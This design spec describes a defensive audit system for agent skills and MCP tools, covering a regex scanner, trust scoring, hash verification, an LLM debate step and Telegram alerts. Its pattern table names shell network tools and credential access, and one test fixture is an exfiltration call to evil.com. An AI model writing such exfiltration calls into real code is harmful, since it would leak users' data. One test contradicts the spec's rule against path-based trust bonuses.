# Design Spec: Skill/MCP Security Audit System

**Date:** 2026-03-22
**Status:** Approved (rev 2 — post-review fixes)
**Branch:** claude/focused-dhawan

---

## Overview

Automated security review gate for all skills and MCP tools loaded into OpenClaw/Clawmson. Enforces the CONSTRAINTS.md rule: "Never install tools or skills without auditing the SKILL.md source first." No skill or MCP is loaded without passing static analysis and trust scoring.

---

## Architecture

### Module Layout

```
scripts/security/
├── __init__.py
├── scanner.py      # static analysis, regex pattern matching
├── scorer.py       # 0-100 trust score + TRUSTED/REVIEW/BLOCKED category
├── registry.py     # skill_registry SQLite table, hash verification
├── debate.py       # 3-agent inline Ollama debate (REVIEW range only)
├── reporter.py     # markdown audit report generation
└── auditor.py      # orchestrator: wires all modules together

scripts/skill_auditor.py           # thin CLI entry point
scripts/tests/test_skill_auditor.py

~/openclaw/security/audits/        # markdown reports
~/.openclaw/clawmson.db            # adds skill_registry table
agents/configs/security-auditor.md
```

### Data Flow

```
skill file(s)
    → scanner.py      → findings list (pattern matches + severity)
    → scorer.py       → trust score 0-100 + category
    → [if REVIEW]
      debate.py       → defender → attacker → judge → adjusted score
    → registry.py     → store hash + score + audit_log
    → reporter.py     → write ~/openclaw/security/audits/<skill>-<date>.md
    → notify Jordan   → Telegram DM (REVIEW/BLOCKED always; TRUSTED logged only)
```

### Hash Verification (cron)

```
registry.py.verify_all()
    → recompute SHA256 for each registered skill's source_path
    → mismatch: re-audit + DM Jordan immediately (Tier-2 alert)
```

---

## Skill Detection (Trigger Model)

**On-demand only** — no daemon, no inotify watcher.

Two triggers:
1. **Cron scan** — daily job scans `~/openclaw/skills/incoming/` for new files not yet in `skill_registry`. Any new file triggers a full audit.
2. **Manual** — Jordan sends `/audit <skill_name>` via Telegram.

Skills in `incoming/` stay there until:
- TRUSTED → auto-moved to `~/openclaw/skills/active/`
- REVIEW → held in `incoming/`, Jordan DM'd to approve/block
- BLOCKED → moved to `~/openclaw/skills/rejected/`, Jordan notified

**Approval enforcement (C1 fix):** When Jordan sends `/approve <skill_name>`, before moving the file `auditor.set_approved()` re-verifies the SHA256 of the file still in `incoming/` against the stored hash. If the hash has changed since audit, the approval is rejected, Jordan is DM'd ("File changed since audit — re-run /audit first"), and the file stays in `incoming/`. Only on hash match does the file move atomically to `active/`.

---

## Component Designs

### scanner.py

Operates entirely on file content — no execution, no imports. Returns a list of `Finding` objects.

**Finding structure:**
```python
@dataclass
class Finding:
    category: str       # network | credential_access | filesystem_write |
                        # obfuscation | shell_injection | exfiltration | dependency_risk
    severity: str       # CRITICAL | HIGH | MEDIUM
    line_no: int
    snippet: str        # ≤120 chars
    context: str        # surrounding lines
```

**Pattern table:**

| Category | Patterns | Severity |
|---|---|---|
| `network` | `requests\|urllib\|httpx\|socket\|aiohttp`, subprocess `curl\|wget\|nc` | HIGH |
| `credential_access` | `.env` reads, `keychain\|token\|secret\|api_key` in var names, `os.environ` | MEDIUM |
| `filesystem_write` | `open(.*['"](w\|wb)`, `Path.write_*`, `shutil.copy\|move` | MEDIUM |
| `obfuscation` | `base64.b64decode\|eval(\|exec(\|compile(`, `__import__` | CRITICAL |
| `shell_injection` | `os.system(`, `subprocess.*shell=True`, `Popen.*shell=True` | HIGH |
| `exfiltration` | HTTP POST/PUT to non-localhost URLs | CRITICAL |
| `dependency_risk` | `pip install` in code, `subprocess.*pip` | MEDIUM |

**SKILL.md mismatch check:** If a `SKILL.md` companion file exists, the scanner checks for a capability block using this convention:

```yaml
# capabilities:
#   network: false
#   filesystem_write: false
#   shell: false
```

Lines starting with `# capabilities:` followed by `#   <key>: <value>` lines are parsed. If a capability is declared `false` but the corresponding scan category finds a match, it is flagged as a mismatch. No SKILL.md or no capabilities block = no mismatch check (neutral, no penalty).

### scorer.py

Translates findings list into a 0–100 trust score.

```
Start:          100
CRITICAL:       −35 each
HIGH:           −15 each
MEDIUM:         −8 each
SKILL.md mismatch: −20
Trust bonus:    +10 if source_url matches a pinned known-good URL prefix
                    (e.g. https://github.com/anthropics/, configurable list)
                    NOTE: path-based bonus is explicitly NOT used — source_path
                    is trivially spoofable. Bonus only applies when source_url
                    is present and matches. Without source_url, no bonus.
Floor: 0  Ceiling: 100
```

**Categories:**
- TRUSTED: 80–100 → auto-approved, logged
- REVIEW: 50–79 → debate runs, Jordan DM'd
- BLOCKED: 0–49 → rejected, Jordan notified with reason

### registry.py

Adds `skill_registry` table to existing `~/.openclaw/clawmson.db`.

```sql
CREATE TABLE IF NOT EXISTS skill_registry (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    skill_name    TEXT    NOT NULL UNIQUE,
    source_path   TEXT    NOT NULL,
    source_url    TEXT,
    install_date  TEXT    NOT NULL,
    hash_sha256   TEXT    NOT NULL,
    trust_score   INTEGER NOT NULL,
    category      TEXT    NOT NULL,   -- TRUSTED / REVIEW / BLOCKED
    audit_log     TEXT,               -- JSON array of Finding dicts
    approved_by   TEXT,               -- 'auto' | 'jordan' | 'blocked'
    last_verified TEXT
);
```

Key functions:
- `register(skill_name, source_path, score, category, findings)` — insert/update
- `verify_all()` → list of `(skill_name, status)` where status is `ok` or `changed`
- `get_all()` → list of all registry rows
- `set_approved(skill_name, approved_by)` — Jordan approval/block
- `get(skill_name)` → single row dict

### debate.py

Three sequential Ollama calls using `qwen3:30b`. Runs only for REVIEW-range skills (50–79).

```
Agent A (defender)
  Prompt: code + findings + "Argue this skill is SAFE. Explain its legitimate
          functionality. Address each finding specifically."

Agent B (attacker)
  Prompt: code + findings + Agent A response + "You are a security auditor.
          Find exploits, injection vectors, data leaks. Challenge every claim."

Agent C (judge)
  Prompt: code + findings + A response + B response + "Produce final verdict.
          Output valid JSON only:
          {verdict: APPROVE|BLOCK, adjusted_score: 0-100, reasoning: str}"
```

Judge JSON is parsed with a regex fallback. Parse failure → score unchanged, Jordan notified to review manually. Debate transcript (all 3 responses) is saved in the audit report.

**Score override rule:** The judge's `adjusted_score` replaces the scorer's output entirely (not bounded to REVIEW range). A judge score of 45 → BLOCKED is valid. This allows the debate to escalate or clear a skill based on argument quality. Fallback model if `qwen3:30b` is unavailable: `qwen3:32b`. Debate calls have a 120-second timeout per agent; timeout → treat as parse failure.

**Re-audit deduplication:** `register()` uses `INSERT OR REPLACE` on `skill_name` (UNIQUE constraint). Re-auditing an existing skill overwrites the prior row. Previous `audit_log` is replaced, not appended.

Ollama endpoint: `http://localhost:11434` (same as rest of OpenClaw).

### reporter.py

Writes `~/openclaw/security/audits/<skill_name>-<YYYY-MM-DD>.md`:

```markdown
# Security Audit: <skill_name>
**Date:** ...  **Score:** 72/100  **Category:** REVIEW  **Approved by:** jordan

## Summary
...one paragraph...

## Findings
| Severity | Category | Line | Snippet |
|---|---|---|---|
...

## SKILL.md Capability Check
Declared: read-only. Actual: filesystem writes detected. ⚠ MISMATCH

## Debate Transcript
**Defender (Agent A):** ...
**Attacker (Agent B):** ...
**Judge (Agent C):** APPROVE — adjusted score 74 — reasoning: ...

## Recommendation
APPROVE / BLOCK / MANUAL REVIEW
```

Daily summary: `~/openclaw/security/audits/summary-<YYYY-MM-DD>.md` — table of all skills, scores, categories, last verified. Generated by the `python3 skill_auditor.py summary` CLI command, called by the nightly cron job. Each run overwrites the day's file with the current state of the full registry (not appended). Running multiple times in one day produces one file reflecting the latest state.

### auditor.py

Orchestrator. Exposes one primary function:

```python
def audit_skill(source_path: str, skill_name: str = None,
                source_url: str = None, notify: bool = True) -> AuditResult
```

Steps:
1. Read file(s) at `source_path`
2. Run `scanner.scan()`
3. Run `scorer.score()`
4. If REVIEW: run `debate.run_debate()`
5. Run `registry.register()`
6. Run `reporter.write_report()`
7. If `notify`: send Telegram DM with result summary

Also exposes:
- `audit_mcp(settings_path)` — scan Claude settings.json for MCP configs
- `verify_all_skills()` — hash check all registered skills

### MCP Audit (auditor.py — audit_mcp)

Reads `~/.claude/settings.json` and project-level `.claude/settings.json`. For each MCP entry:

1. **Config analysis**: log what tools/permissions it declares
2. **Source check**: if `command` points to a local file → run `scanner.scan()` on it
3. **Remote flag**: if npm package or remote URL → flag for manual review, fixed score 55 (REVIEW range), **no debate runs** (no local file to scan = no findings = debate would be meaningless). Jordan receives a DM: "🟡 Remote MCP: <name> — manual review required. No local source to scan."
4. **Permission check**: flag MCPs declaring `filesystem`, `shell`, or `network` access without localhost restriction

Results registered in `skill_registry` with `skill_name = "mcp:<server_name>"`.

**Error handling:** If `settings.json` is absent or not valid JSON, `audit_mcp` logs a warning to `~/openclaw/logs/security-auditor.jsonl` and returns an empty result — no crash, no notification. Jordan can trigger a manual re-run once the file is present.

---

## Telegram Integration

New handlers added to `telegram-dispatcher.py`:

| Command | Handler | Notes |
|---|---|---|
| `/audit <skill_name>` | `handle_audit_skill` | Full audit, reply with score + category |
| `/skills` | `handle_skills_list` | Table: name, score, category, last verified |
| `/approve <skill_name>` | Updated `handle_approve` | Routes to skill approve if not a task ID |
| `/block <skill_name>` | `handle_skill_block` | Sets category=BLOCKED, approved_by=blocked |

Auto-notifications (no command required):

| Event | Message | Tier |
|---|---|---|
| New skill in incoming/ | `🟡 New skill pending audit: <name>` | Tier-2 |
| Hash mismatch | `🔴 Skill hash changed: <name> — re-auditing` | Tier-2 |
| BLOCKED result | `🔴 Skill BLOCKED: <name> — <top finding snippet>` | Tier-2 |
| REVIEW result | `🟡 Skill needs review: <name> (score: N) — /approve or /block <name>` | Tier-2 |

---

## skill_auditor.py (CLI Entry Point)

```
python3 skill_auditor.py audit <path_or_name>
python3 skill_auditor.py verify           # hash-check all registered skills
python3 skill_auditor.py list             # print registry table
python3 skill_auditor.py summary          # generate daily summary report
python3 skill_auditor.py mcp              # audit all MCP configs
```

Thin wrapper over `auditor.py`. Used by cron and Telegram handlers.

---

## Tests (scripts/tests/test_skill_auditor.py)

All use `unittest` + mocks for Ollama (no live inference). Pattern matches existing test files.

| Test | What it verifies |
|---|---|
| `test_scanner_detects_eval` | `eval(user_input)` → CRITICAL finding |
| `test_scanner_detects_shell_true` | `subprocess.run(cmd, shell=True)` → HIGH finding |
| `test_scanner_detects_exfiltration` | `requests.post("http://evil.com", data=x)` → CRITICAL |
| `test_scanner_clean_file` | benign file → zero findings |
| `test_scorer_critical_blocked` | 2 CRITICAL findings → score < 50 → BLOCKED |
| `test_scorer_trust_bonus` | anthropic-skills path → +10 applied |
| `test_scorer_skill_md_mismatch` | declares read-only, writes files → −20 penalty |
| `test_registry_hash_roundtrip` | store hash, verify same file → ok; modify → changed |
| `test_registry_update_approval` | set_approved() changes approved_by field |
| `test_debate_parse_failure_handled` | judge returns non-JSON → score unchanged, no crash |

---

## agents/configs/security-auditor.md

Documents the security auditor agent: role, scan patterns, scoring rules, Ollama model assignment (`qwen3:30b`), directory layout, and Telegram command reference.

---

## Directory Requirements

```
~/openclaw/skills/incoming/     # drop zone for unaudited skills
~/openclaw/skills/active/       # TRUSTED or jordan-approved skills
~/openclaw/skills/rejected/     # BLOCKED skills (kept for record)
~/openclaw/security/audits/     # markdown audit reports
```

---

## Constraints Compliance

- All inference via local Ollama (`http://localhost:11434`) — no external API calls
- Telegram notifications are DM-only (existing ALLOWED_USERS allowlist applies)
- Audit reports stay local — never transmitted externally
- BLOCKED skills are rejected before any code runs — scanner is pure static analysis
- Hash verification runs on daily cron (`verify_all`) + at approval time (re-check before `active/` move). "On every load" is NOT enforced at the Python import level — the skill loader does not currently call registry. This is a known limitation; a future phase can add a loader hook.
